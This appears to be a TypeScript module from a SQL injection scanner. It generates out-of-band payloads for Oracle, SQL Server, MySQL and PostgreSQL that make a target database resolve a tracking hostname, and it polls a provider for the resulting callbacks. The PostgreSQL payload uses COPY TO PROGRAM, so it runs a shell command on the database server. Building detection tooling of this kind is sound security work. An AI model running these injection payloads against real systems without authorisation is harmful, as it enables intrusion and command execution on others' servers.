import { CandidateParameter, DbmsType, OobConfig, OobInteraction } from '../../types/sqlScanner';

export interface OobPayloadItem {
  dbms: DbmsType;
  channel: 'DNS' | 'HTTP';
  token: string;
  payload: string;
  description: string;
}

export class OobManager {
  private static correlationStore: Map<string, {
    token: string;
    paramName: string;
    targetUrl: string;
    timestamp: number;
    dbms: DbmsType;
  }> = new Map();

  /**
   * Generates a unique correlation token for Out-of-Band testing
   */
  public static generateToken(param: CandidateParameter, targetUrl: string, dbms: DbmsType, domain = 'oast.sentinel.local'): { token: string; fqdn: string } {
    const uniqueId = `snt${Math.random().toString(36).substring(2, 8)}${Date.now().toString().slice(-4)}`;
    const fqdn = `${uniqueId}.${domain}`;

    OobManager.correlationStore.set(uniqueId, {
      token: uniqueId,
      paramName: param.name,
      targetUrl,
      timestamp: Date.now(),
      dbms,
    });

    return { token: uniqueId, fqdn };
  }

  /**
   * Generates Out-of-Band interaction payloads for supported DBMS dialects
   */
  public static getOobPayloads(param: CandidateParameter, fqdn: string): OobPayloadItem[] {
    const isNum = param.detectedContext === 'numeric' || /^\d+$/.test(param.originalValue.trim());
    const isDoubleQuote = param.detectedContext === 'double_quote_string';

    const payloads: OobPayloadItem[] = [];

    // 1. Oracle (UTL_INADDR DNS Host Resolution)
    let oraPayload = `'||(SELECT UTL_INADDR.get_host_name('${fqdn}') FROM DUAL)||'`;
    if (isNum) oraPayload = ` AND (SELECT UTL_INADDR.get_host_name('${fqdn}') FROM DUAL) IS NOT NULL`;
    else if (isDoubleQuote) oraPayload = `"||(SELECT UTL_INADDR.get_host_name('${fqdn}') FROM DUAL)||"`;

    payloads.push({
      dbms: 'Oracle',
      channel: 'DNS',
      token: fqdn,
      payload: oraPayload,
      description: 'Oracle UTL_INADDR.get_host_name DNS resolution callback',
    });

    // 2. Microsoft SQL Server (master..xp_dirtree SMB/DNS)
    let mssqlPayload = `'; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;
    if (isNum) mssqlPayload = `; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;
    else if (isDoubleQuote) mssqlPayload = `"; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;

    payloads.push({
      dbms: 'Microsoft SQL Server',
      channel: 'DNS',
      token: fqdn,
      payload: mssqlPayload,
      description: 'MSSQL master..xp_dirtree UNC path resolution',
    });

    // 3. MySQL (LOAD_FILE UNC DNS lookup)
    let mysqlPayload = `' AND (SELECT LOAD_FILE('\\\\\\\\${fqdn}\\\\snt'))-- -`;
    if (isNum) mysqlPayload = ` AND (SELECT LOAD_FILE('\\\\\\\\${fqdn}\\\\snt'))`;

    payloads.push({
      dbms: 'MySQL',
      channel: 'DNS',
      token: fqdn,
      payload: mysqlPayload,
      description: 'MySQL LOAD_FILE UNC share DNS lookup',
    });

    // 4. PostgreSQL (COPY or dblink host lookup)
    let pgPayload = `'; COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;
    if (isNum) pgPayload = `; COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;

    payloads.push({
      dbms: 'PostgreSQL',
      channel: 'DNS',
      token: fqdn,
      payload: pgPayload,
      description: 'PostgreSQL COPY to program DNS lookup',
    });

    return payloads;
  }

  /**
   * Polls OOB provider client for incoming interaction events matching our correlation store
   */
  public static async pollInteractions(config: OobConfig): Promise<OobInteraction[]> {
    if (!config.enabled || !config.providerUrl) {
      return [];
    }

    try {
      const res = await fetch(`${config.providerUrl}/api/interactions?apiKey=${config.apiKey || ''}`);
      if (res.ok) {
        const data = await res.json();
        return Array.isArray(data) ? data : [];
      }
    } catch {
      // Offline/local test mode
    }

    return [];
  }
}
